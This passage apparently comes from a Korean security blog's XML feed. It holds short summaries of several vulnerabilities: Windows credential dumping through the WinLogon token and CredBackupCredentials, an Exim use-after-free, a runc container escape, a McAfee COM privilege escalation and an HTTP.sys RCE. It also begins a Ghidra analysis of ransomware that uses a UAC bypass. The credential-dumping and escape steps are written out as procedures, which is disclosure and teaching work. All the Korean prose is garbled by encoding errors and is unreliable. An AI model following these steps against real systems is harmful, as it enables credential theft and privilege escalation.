<code>Winlogon</code> í”„ë¡œì„¸ìŠ¤ì— RPCë¥¼ í˜¸ì¶œí•˜ì—¬ credentialì„ ë°±ì—…í•˜ëŠ”ë°, ì´ ë•Œ ë°±ì—…í•˜ëŠ” ë°ì´í„°ì—ëŠ” ëª¨ë“  ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ë‹¤ì‹œ ë³µêµ¬í•˜ë©° ëª¨ë“  ì •ë³´ê°€ ë‹´ê²¨ ìˆëŠ” credentialì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë”°ë¼ì„œ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ì•„ë˜ ê³¼ì •ì„ í†µí•´ ëª¨ë“  ì‚¬ìš©ìì˜ credentialì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li><code>WinLogon</code> í”„ë¡œì„¸ìŠ¤ì— ì ‘ê·¼í•´ í† í°ì˜ í•¸ë“¤ì„ íšë“í•©ë‹ˆë‹¤.</li><li>íšë“í•œ í† í°ì„ Impersonation í† í°ìœ¼ë¡œ ë³µì‚¬í•˜ê³  <code>SeTrustedCredmanAccessPrivilege</code> ê¶Œí•œì„ í™œì„±í™”í•©ë‹ˆë‹¤.</li><li>ì¸ì¦ëœ ì‚¬ìš©ìì˜ í† í°ì„ Open í•©ë‹ˆë‹¤.</li><li>Impersonationëœ <code>WinLogon</code> í† í°ì„ í™œìš©í•˜ì—¬ <code>CredBackupCredentials</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ì›í•˜ëŠ” ê²½ë¡œì— crendentialì„ ì €ì¥í•©ë‹ˆë‹¤. ì´ ë•Œ ë°±ì—… ì‹œ ë¹„ë°€ë²ˆí˜¸ëŠ” NULLë¡œ ì„¤ì •í•  ìˆ˜ ìˆì–´ ì¶”ê°€ì ì¸ ë³µí˜¸í™”í•  ìˆ˜ê³ ë¥¼ ëœ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li><li>Impersonation ìƒíƒœì—ì„œ <code>CryptUnprotectData</code> í•¨ìˆ˜ë¥¼ í†µí•´ credentialì„ ë³µí˜¸í™”í•©ë‹ˆë‹¤.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>j0ker</tag>
      
      <tag>token</tag>
      
      <tag>privileges</tag>
      
      <tag>setrustedcredmanaccessprivilege</tag>
      
      <tag>credentials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-28018: Unix ê³„ì—´ ë©”ì¼ ì—ì´ì „íŠ¸ RCE</title>
    <link href="/2021/05/22/fabu1ous/2021-05-22/"/>
    <url>/2021/05/22/fabu1ous/2021-05-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://adepts.of0x.cc/exim-cve-2020-28018/">CVE-2020-28018 (Use-After-Free in Exim)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Exim 4 &lt;= 4.92.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Unix ê³„ì—´ ìš´ì˜ ì²´ì œì˜ MTA(Mail Transfer Agent)ì¸ Eximì—ì„œ use-after-free ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. <code>tls-openssl.c</code>ì— ì¡´ì¬í•˜ëŠ” í•´ë‹¹ ì·¨ì•½ì ì„ í†µí•´ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ ë° ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> tls<span class="hljs-constructor">_write(<span class="hljs-params">void</span> <span class="hljs-operator">*</span> <span class="hljs-params">ct_ctx</span>, <span class="hljs-params">const</span> <span class="hljs-params">uschar</span> <span class="hljs-operator">*</span><span class="hljs-params">buff</span>, <span class="hljs-params">size_t</span> <span class="hljs-params">len</span>, BOOL <span class="hljs-params">more</span>)</span>&#123;...  corked = <span class="hljs-built_in">string</span><span class="hljs-constructor">_catn(<span class="hljs-params">corked</span>, <span class="hljs-params">buff</span>, <span class="hljs-params">len</span>)</span>;    ...  <span class="hljs-keyword">if</span> (more)    return len;  buff = CUS corked-&gt;s;  len = corked-&gt;ptr;  corked = NULL;...&#125;</code></pre><p>ìœ„ëŠ” <code>tls-openssl.c</code>ì˜ í•¨ìˆ˜ <code>tls_write()</code> ì¼ë¶€ ì½”ë“œì…ë‹ˆë‹¤. í•¨ìˆ˜ <code>string_catn()</code>ëŠ” <code>gstring</code> êµ¬ì¡°ì²´ê°€ request ë°ì´í„°ë¥¼ ë‹´ê¸°ì— ì¶©ë¶„í•œ ë©”ëª¨ë¦¬ ê³µê°„ì„ ê°€ì§€ê³  ìˆëŠ”ì§€ ê²€ì‚¬í•˜ê³  <code>gstring_grow()</code>ë¥¼ í˜¸ì¶œí•´ ìƒˆë¡œìš´ ì²­í¬ë¥¼ í• ë‹¹í•œ í›„ <code>gstring-&gt;s</code> í•„ë“œì— ì €ì¥í•©ë‹ˆë‹¤. <code>string_catn()</code>ì´ ë°˜í™˜í•œ <code>gstring</code> í¬ì¸í„°ë¥¼ <code>corked</code>ì— ì €ì¥í•˜ê³  ì´í›„ì— <code>gstring</code>ì— ì ‘ê·¼í•´ì•¼ í•  ì¼ì´ ìƒê¸°ë©´ <code>corked</code>ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ë¬¸ì œëŠ” <code>corked</code>ê°€ NULLë¡œ ì´ˆê¸°í™”ë˜ëŠ” ë£¨í‹´ì„ ë¬´ì‹œí•  ìˆ˜ ìˆì–´ <code>corked-&gt;s</code>ê°€  í•´ì œëœ ì´í›„ì—ë„ <code>corked</code>ë¥¼ í†µí•´ ì ‘ê·¼(use-after-free)í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>lpe</tag>
      
      <tag>unix</tag>
      
      <tag>exim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-30465: Docker, Kubernetesì˜ runc Container Escape ì·¨ì•½ì </title>
    <link href="/2021/05/21/l0ch/2021-05-21/"/>
    <url>/2021/05/21/l0ch/2021-05-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/157">CVE-2021-30465: runc &lt;1.0.0-rc95 vulnerable to symlink-exchange attack</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>runc â‰¤ 1.0.0-rc94 </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Docker, Kubernetes ë“± ëŒ€ë¶€ë¶„ì˜ ì»¨í…Œì´ë„ˆ ê¸°ë°˜ ê°€ìƒí™” ì„œë¹„ìŠ¤ì—ì„œ ì‚¬ìš©ë˜ëŠ” runcì—ì„œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ ì„¸ë¶€ ë³´ê³ ì„œê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>runcëŠ” OCI(Open Container Initiative) í‘œì¤€ì„ ê¸°ë°˜ìœ¼ë¡œ ì»¨í…Œì´ë„ˆ ìƒì„±ê³¼ ì‹¤í–‰ì„ ìœ„í•´ ì„¤ê³„ëœ CLI ë„êµ¬ì…ë‹ˆë‹¤. ì§€ë‚œ 2019ë…„ Container escape ì·¨ì•½ì (CVE-2019-5736)ì´ ê³µê°œëœ ë° ì´ì–´ ì´ë²ˆì— ê³µê°œëœ ì·¨ì•½ì€ symlink exchange attackìœ¼ë¡œ í˜¸ìŠ¤íŠ¸ íŒŒì¼ ì‹œìŠ¤í…œì´ ì»¨í…Œì´ë„ˆì— ë§ˆìš´íŠ¸ ë˜ë„ë¡ í•  ìˆ˜ ìˆëŠ” escape ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p>ì»¨í…Œì´ë„ˆê°€ ì‹œì‘ë˜ê³  runcê°€ ì»¨í…Œì´ë„ˆ ê³µìœ  ë³¼ë¥¨ ë‚´ë¶€ì— ë§ˆìš´íŠ¸ ë˜ëŠ” ê²½ìš° runcëŠ” ë§ˆìš´íŠ¸ ë˜ëŠ” ëŒ€ìƒì„ ê²€ì‚¬í•©ë‹ˆë‹¤. ì´ë•Œ ë§ˆìš´íŠ¸ ëŒ€ìƒì„ ì»¨í…Œì´ë„ˆ rootfs ì™¸ë¶€ì˜ í˜¸ìŠ¤íŠ¸ íŒŒì¼ ì‹œìŠ¤í…œì˜ ì‹¬ë³¼ë¦­ ë§í¬ë¡œ êµì²´í•˜ë©´ ì»¨í…Œì´ë„ˆë¥¼ escape í•´ ì»¨í…Œì´ë„ˆì—ì„œ í˜¸ìŠ¤íŠ¸ íŒŒì¼ ì‹œìŠ¤í…œì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ì¸ ê²½ìš° <code>MS_SLAVE</code> ì „íŒŒ íƒ€ì…ì´ ì ìš©ëœ ë§ˆìš´íŠ¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë‚´ì—ì„œëŠ” í˜¸ìŠ¤íŠ¸ì— ì ‘ê·¼í•  ìˆ˜ ì—†ì§€ë§Œ Kubernetesì™€ ê°™ì´ ë³¼ë¥¨ ê´€ë¦¬ ì¸í”„ë¼ê°€ ì¡´ì¬í•˜ëŠ” ê²½ìš° ë‹¤ìŒê³¼ ê°™ì´ ì»¨í…Œì´ë„ˆì—ì„œ í˜¸ìŠ¤íŠ¸ íŒŒì¼ ì‹œìŠ¤í…œì„ ë§ˆìš´íŠ¸ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li>í•´ì»¤ëŠ” ì˜ ì•Œë ¤ì§„ í˜¸ìŠ¤íŠ¸ì˜ ë³¼ë¥¨ ê´€ë¦¬ì— ì‚¬ìš©ë˜ëŠ” ê²½ë¡œë¡œ ì ‘ê·¼</li><li>ë§ˆìš´íŠ¸ ì†ŒìŠ¤ ë””ë ‰í† ë¦¬ì— í˜¸ìŠ¤íŠ¸ì˜ <code>/</code> ì— ëŒ€í•œ ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ìƒì„±í•˜ëŠ” ì•…ì„±ì½”ë“œ ì‹¤í–‰</li><li>ì»¨í…Œì´ë„ˆì˜ í›„ì† ë§ˆìš´íŠ¸ì—ì„œ toctouë¥¼ íŠ¸ë¦¬ê±°í•´ <code>/</code> ë¥¼ ë§ˆìš´íŠ¸</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>toctou</tag>
      
      <tag>escape</tag>
      
      <tag>docker</tag>
      
      <tag>L0ch</tag>
      
      <tag>vulnerability</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-23874: McAfee COM-objects ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì </title>
    <link href="/2021/05/20/idioth/2021-05-20/"/>
    <url>/2021/05/20/idioth/2021-05-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://the-deniss.github.io/posts/2021/05/17/discovering-and-exploiting-mcafee-com-objects.html">Discovering and exploiting McAfee COM-objects (CVE-2021-23874)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>McAfee Total Protection 16.0.30 ì´ì „ ë²„ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>McAfeeì˜ í”Œë˜ê·¸ì‹­ ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ ì œí’ˆ McAfee Total Protectionì˜ COM ê°ì²´ì—ì„œ local privilege escalationì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>McAWFwk ì„œë¹„ìŠ¤ì—ì„œ <code>CoInitializeSecurity</code> í•¨ìˆ˜ê°€ í˜¸ì¶œë  ë•Œ <code>pSecDesc</code> íŒŒë¼ë¯¸í„°ëŠ” ë„ í¬ì¸í„°ì´ë©° <code>dwCapabilities</code>ì˜ ê°’ì€ 0ì…ë‹ˆë‹¤. <code>dwCapabilities</code> íŒŒë¼ë¯¸í„°ì— <code>EOAC_AAPID</code>ë‚˜ <code>EOAC_ACCESS_CONTROL</code> í”Œë˜ê·¸ê°€ ì„¤ì •ë˜ì–´ ìˆì§€ ì•Šìœ¼ë©´, <code>CoInitializeSecurity</code>ëŠ” <code>pSecDesc</code>ë¥¼ ì•¡ì„¸ìŠ¤ ê²€ì‚¬ì— ì‚¬ìš©í•˜ëŠ” í¬ì¸í„°ë¡œ ì¸ì‹í•©ë‹ˆë‹¤. ë”°ë¼ì„œ <code>pSecDesc</code>ê°€ ë„ í¬ì¸í„°ì´ë¯€ë¡œ ACL ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p><p>ì´ë¥¼ í†µí•´ ì‹œì‘ ì‹œ <code>IMcClassFactory</code>ë¥¼ í†µí•´ <code>CoManageOem Class</code> ê°ì²´ë¥¼ êµ¬í˜„í•˜ê³  <code>IMcClassFactory::InternalCreateObject</code>ë¥¼ í†µí•´ ê°ì²´ë¥¼ ë°˜í™˜ ë°›ì•„ <code>ImanageOem::RunProgram</code>ì„ í†µí•´ <code>NT Authority\System</code> ê¶Œí•œìœ¼ë¡œ ì„ì˜ í”„ë¡œì„¸ìŠ¤ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ COM ê°ì²´ë¥¼ êµ¬í˜„í•  ë•Œ ProxyStub DLLì— self-defense ê¸°ëŠ¥ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì´ëŠ” PEB êµ¬ì¡°ë¥¼ ìˆ˜ì •í•˜ì—¬ <code>ValidateModule</code> í•¨ìˆ˜ì˜ ìœ íš¨ì„± ê²€ì‚¬ ì‹œ í”„ë¡ì‹œê°€ í˜¸ì¶œë˜ëŠ” ëª¨ë“ˆì˜ ê²½ë¡œë¥¼ ìŠ¤í‘¸í•‘í•˜ì—¬ ìš°íšŒê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì²« ë²ˆì§¸ ê²€ì‚¬ê°€ ìˆ˜í–‰ë˜ê¸° ì „ì— McAfeeì˜ ì„œëª…ì´ ëœ ì•„ë¬´ ë°”ì´ë„ˆë¦¬ì˜ ê²½ë¡œë¥¼ <code>MasqueradeImagePath</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ìš°íšŒê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>mcafee</tag>
      
      <tag>idioth</tag>
      
      <tag>com</tag>
      
      <tag>arbitrary process execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-31166: HTTP.sys ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì </title>
    <link href="/2021/05/19/fabu1ous/2021-05-19/"/>
    <url>/2021/05/19/fabu1ous/2021-05-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/17/cve-2021-31166-a-wormable-code-execution-bug-in-httpsys">A WORMABLE CODE EXECUTION BUG IN HTTP.SYS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10</p><p>Windows server 2004</p><p>Windows server 20H2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>ì»¤ë„ ë“œë¼ì´ë²„ Http.sysë¥¼ ì‚¬ìš©í•˜ëŠ” ì›¹ì„œë²„ IIS(Internet Information services) Windows Serverì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. Http.sysëŠ” http request íŒŒì‹± ë° í´ë¼ì´ì–¸íŠ¸ë¡œ ë³´ë‚¼ response ìƒì„±ì„ ë‹´ë‹¹í•©ë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ Http request header <code>Accept-Encoding</code>ì„ íŒŒì‹± í•˜ê³  ê´€ë¦¬í•˜ëŠ” ë©”ì»¤ë‹ˆì¦˜ì˜ ì„¤ê³„ ê²°í•¨ìœ¼ë¡œ ë°œìƒí•©ë‹ˆë‹¤. </p><p>í´ë¼ì´ì–¸íŠ¸ëŠ”  <code>Accept-Encoding</code> headerë¥¼ ì‚¬ìš©í•´ ì›¹ì„œë²„ì—ê²Œ ì‚¬ìš© ê°€ëŠ¥í•œ ë°ì´í„° ì••ì¶• ë°©ì‹ì„ ì „ë‹¬í•©ë‹ˆë‹¤. ì›¹ì„œë²„ëŠ” ì „ë‹¬ë°›ì€  <code>Accept-Encodeing</code>ì˜ í•„ë“œ ê°’ì„ íŒŒì‹±í•˜ê³  unknown, supported, invalidë¡œ êµ¬ë¶„í•´ ì—°ê²° ë¦¬ìŠ¤íŠ¸ë¥¼ ìƒì„±í•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤. unknownì˜ ê²½ìš° ì›í˜• ì´ì¤‘ ì—°ê²° ë¦¬ìŠ¤íŠ¸ë¥¼ ì‚¬ìš©í•˜ê³ , íŒŒì‹±ì´ ëë‚˜ ì—°ê²° ë¦¬ìŠ¤íŠ¸ê°€ ì™„ì„±ë˜ë©´ ìŠ¤íƒ ë©”ëª¨ë¦¬ì— ìˆëŠ” ê¸°ì¡´ root ë…¸ë“œë¥¼ ë²„ë¦¬ê³  internal structure ì† root ë…¸ë“œë¡œ ì—°ê²° ë¦¬ìŠ¤íŠ¸ë¥¼ ì˜®ê¸°ëŠ” ì‘ì—…ì„ í•©ë‹ˆë‹¤. ì´ë•Œ ê¸°ì¡´ root ë…¸ë“œê°€ ì´ˆê¸°í™”ë˜ì§€ ì•Šì•„ ì—¬ì „íˆ ì—°ê²° ë¦¬ìŠ¤íŠ¸ì— ì—°ê²°ë˜ì–´ ìˆê³  ì´ë¥¼ í†µí•´ use-after-freeê°€ ë°œìƒí•©ë‹ˆë‹¤. í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•œ ì•…ì„± HTTP requestë¥¼ ì›ê²© ì‹œìŠ¤í…œì— ë³´ë‚´ Kernel ê¶Œí•œìœ¼ë¡œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>wormable</tag>
      
      <tag>http</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 4 - Malware Analysis (1)</title>
    <link href="/2021/05/19/idioth/ghidra_part4/"/>
    <url>/2021/05/19/idioth/ghidra_part4/</url>
    
    <content type="html"><![CDATA[<p><strong>ë‹¤ë¥¸ íŒŒíŠ¸ ë³´ëŸ¬ê°€ê¸°</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 2 - Data, Functions, Scripts</a></p><p><a href="https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3/">Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 3 - tips for IDA User (Here!)</a></p><p>Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 4 - Malware Analysis (1) (Here!)</p><hr><p>ë°˜ê°‘ìŠµë‹ˆë‹¤. 3ì¼ ë§Œì— ëµ™ëŠ”êµ°ìš”. ì¼ìš”ì¼ ë²ˆì—­ ê¸€ì—ì„œ ë§ì”€ ë“œë ¸ë‹¤ì‹œí”¼ ghidra ê¸€ì„ ë¹ ë¥´ê²Œ(?) ì‘ì„±ì„ í•´ì™”ìŠµë‹ˆë‹¤.</p><p>ì‚¬ì‹¤ìƒ ë¶„ì„ì„ í•˜ë©´ì„œ ëŠë‚€ ì ì€ ì•„ ì´ê±° ì¼ì¼ì´ ë‹¤ ì„¸ì„¸í•˜ê²Œ í•˜ë©´ ë­”ê°€ ì£¼ê°ì´ ì „ë„ë˜ëŠ” ê±° ê°™ì€ë°â€¦ ghidra ê¸€ì´ ì•„ë‹ˆë¼ ì•…ì„±ì½”ë“œ ë¶„ì„ì— ì´ˆì ì´ ë§ì¶°ì§€ëŠ” ê±° ì•„ë‹Œê°€? <del>í‹€ë¦° ë¶€ë¶„ì´ ìˆìœ¼ë©´ ì–´ë–¡í•˜ì§€</del>ë¼ëŠ” ìƒê°ìœ¼ë¡œ ì¸í•´ ê°€ë³ê²Œ ì–´ë– í•œ ì‹ìœ¼ë¡œ ë¶„ì„ì„ í•˜ê¸° í¸í•˜ê²Œ ë””ì»´íŒŒì¼ëŸ¬ë¥¼ ì„¤ì •í•  ìˆ˜ ìˆëŠ”ì§€! ì¤‘ì ìœ¼ë¡œ ë‹¤ë£° ì˜ˆì •ì…ë‹ˆë‹¤. </p><p>ë¶„ì„ì„ í•´ë³¼ ì•…ì„±ì½”ë“œëŠ” ataware ëœì„¬ì›¨ì–´ì…ë‹ˆë‹¤. ìŠ¤í¬ë¦½íŠ¸ â†’ ATAPIinit â†’ ATAPIConfiguration â†’ ATAPIUpdtr ìˆœìœ¼ë¡œ ë°”ì´ë„ˆë¦¬ë¥¼ ë“œë¡­í•˜ê³  ì•…ì„± í–‰ìœ„ë¥¼ ì§„í–‰í•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ê¸€ì€ ghidraì— ê´€ë ¨ëœ ê¸€ì´ê¸° ë•Œë¬¸ì— ë’¤ì— ì„¸ ê°œì˜ ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•  ì˜ˆì •ì…ë‹ˆë‹¤. ì´ë²ˆ ê²Œì‹œê¸€ì—ì„œëŠ” ATAPinitì— ëŒ€í•´ì„œ ë‹¤ë£¨ì–´ ë´…ì‹œë‹¤!</p><h1 id="ghidraë¥¼-í†µí•´-ë¶„ì„-ê³ ê³ "><a href="#ghidraë¥¼-í†µí•´-ë¶„ì„-ê³ ê³ " class="headerlink" title="ghidraë¥¼ í†µí•´ ë¶„ì„ ê³ ê³ "></a>ghidraë¥¼ í†µí•´ ë¶„ì„ ê³ ê³ </h1><p>ATAPIinit ë°”ì´ë„ˆë¦¬ëŠ” <a href="https://app.any.run/tasks/e8e682e8-6d7f-42c8-ad3f-6afa980a77e3/">app.any.run</a>ì—ì„œ ë°›ìœ¼ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì¼ë‹¨ ë¨¼ì € í•´ë‹¹ ë°”ì´ë„ˆë¦¬ì— ëŒ€í•´ì„œ ì•Œì•„ë³´ê¸° ìœ„í•´ Detect It Easyì— ATAPinitì„ ë„£ì–´ë´…ì‹œë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled.png"></p><p>MinGWë¡œ ì»´íŒŒì¼ë˜ì—ˆìœ¼ë©°, 32ë¹„íŠ¸ ë°”ì´ë„ˆë¦¬ë„¤ìš”.</p><p>ë¬¸ìì—´ì„ í™•ì¸ì„ í•´ì„œ ì–´ë–¤ ë™ì‘ì„ í•˜ëŠ”ì§€ ëŒ€ê°• ìœ ì¶”ë¥¼ í•´ë´…ì‹œë‹¤. PEStudioë¡œ í™•ì¸ì„ í•´ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%201.png"></p><p>ëˆˆì— ë„ëŠ” ë¬¸ìì—´ì€ <code>Elevation:Administrator!new:</code>, <code>CLSIDFromString</code>, <code>&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;</code>, <code>dl.dropboxusercontent.com</code>ì •ë„ ì…ë‹ˆë‹¤.</p><p><code>&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;</code>ë¥¼ í†µí•´ì„œ êµ¬ê¸€ì— ê²€ìƒ‰ì„ í•´ë³¸ ê²°ê³¼ COM Interfaceë¥¼ í†µí•´ UAC bypassë¥¼ í•˜ëŠ” ê¸°ë²•ì— ëŒ€í•´ì„œ ë‚˜ì˜¤ë„¤ìš”. <code>Elevation:Administarator!new:</code>ì™€ ì—°ê³„í–ˆì„ ë•Œ COMì„ ì‚¬ìš©í•´ì„œ ê¶Œí•œ ìƒìŠ¹ì„ í•œ í›„, <code>dl.dropboxusercontent.com</code> ë§í¬ë¥¼ í†µí•´ ATAPIConfigurationì„ ë‹¤ìš´ë¡œë“œí•œë‹¤ë¼ê³  ìƒê°ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%202.png"></p><p>ì•—! ê·¸ëŸ¼ ì´ì œ ëŒ€ì¶© ì–´ë–¤ ì‘ì—…ì„ í•˜ëŠ”ì§€ ì•Œì•˜ìœ¼ë‹ˆ ghidraë¥¼ ì‚¬ìš©í•˜ì—¬ ë´…ì‹œë‹¤. ğŸ™‚</p><p>ì•…ì„±ì½”ë“œ ë¶„ì„ íŒŒíŠ¸ì—ì„œëŠ” Variable/Function rename, Data type Redefine, Redefine Function Signature ë“±ì˜ ê¸°ëŠ¥ì„ ë§ì´ ì‚¬ìš©í•  ì˜ˆì •ì…ë‹ˆë‹¤. ì¢€ ë” ë³´ê¸° í¸í•˜ê²Œ ë§Œë“¤ê¸° ìœ„í•´ì„œìš”!</p><p>ë¨¼ì € ìƒˆ í”„ë¡œì íŠ¸(ì €ì˜ ê²½ìš° atawareë¡œ ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤.)ë¥¼ ìƒì„±í•œ í›„ ATAPIinitì„ ì¶”ê°€í•˜ê³  ì—´ì–´ì„œ analysisë¥¼ í•©ì‹œë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%203.png"></p><h2 id="UAC-Bypass-í•¨ìˆ˜"><a href="#UAC-Bypass-í•¨ìˆ˜" class="headerlink" title="UAC Bypass í•¨ìˆ˜"></a>UAC Bypass í•¨ìˆ˜</h2><p>Aggressive Instruction FinderëŠ” ì²´í¬ê°€ í’€ë ¤ìˆìœ¼ë‹ˆ ì²´í¬ë¥¼ í•˜ê³  Analyzeë¥¼ í•©ë‹ˆë‹¤.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%204.png"></p><p><code>entry</code>ì—ì„œ <code>FUN_00401570</code>ì„ ì°¾ìŠµë‹ˆë‹¤. ì´ ë¶€ë¶„ì„ ì¤‘ì ì ìœ¼ë¡œ(?) ë¶„ì„ì„ í•´ë³¼ ê³„íšì…ë‹ˆë‹¤. í´ë¦­ì„ í•´ì„œ ë“¤ì–´ê°€ë©´ ì—¬ëŸ¬ ê°œì˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401570</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  FUN_0040da90();  DAT_00416020 = FUN_00410ab0(<span class="hljs-number">0x20a</span>);  DAT_00416024 = FUN_00410ab0(<span class="hljs-number">0x20a</span>);  FUN_00401657(<span class="hljs-number">0</span>);  FUN_004017e4();  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;</code></pre><p>ê·¸ì¤‘ì—ì„œ ì•„ê¹Œ ìœ„ì—ì„œ í™•ì¸í–ˆë˜ ë¶€ë¶„ì¸ COMì„ ì´ìš©í•˜ì—¬ UACë¥¼ ìš°íšŒí•˜ëŠ” í•¨ìˆ˜ë¥¼ ì‚´í´ë´…ì‹œë‹¤! <code>FUN_004017e4()</code>ë¡œ ë“¤ì–´ê°€ì‹œë©´ ë©ë‹ˆë‹¤. ì²˜ìŒ ë“¤ì–´ê°”ì„ ë•Œ, ë””ì»´íŒŒì¼ëŸ¬ì—ì„œ ë‚˜ì˜¤ëŠ” ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs 